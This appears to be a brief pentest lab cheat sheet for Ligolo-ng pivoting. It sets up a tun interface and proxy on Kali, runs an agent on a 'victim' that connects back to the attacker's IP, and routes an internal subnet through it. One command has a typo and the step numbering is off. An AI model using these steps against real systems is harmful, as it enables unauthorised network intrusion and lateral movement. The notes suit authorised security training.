
	1. Setting up Ligolo-ng
		
		○ ``` sudo ip tuntap add user $USER mode tun ligolo ```
		○ ``` sudo ip link setligolo up ```

	2. Running proxy on Kali device:

		○ ``` ./proxy -selfcert ``` - Server

	3. Running agent on Victim Device:

		○ ``` ./agent -retry -ignore-cert -connect 192.168.45.232:11601 ``` connect to kali server

	4. Checking session in proxy:

		○ ``` session ``` - Prints session, use 1 if 1

	1. Checking interfaces using ifconfig:

		○ ``` ifconfig ``` - Note the IP address of the internal interface

	6. Adding route in Kali to tunnel:

		○ ``` sudo ip route add 10.4.219.0/24 dev ligolo ``` - After tunneling we can use the interface ip to communicate

	7. Starting tunneling:

		○ ``` start ``` - in proxy
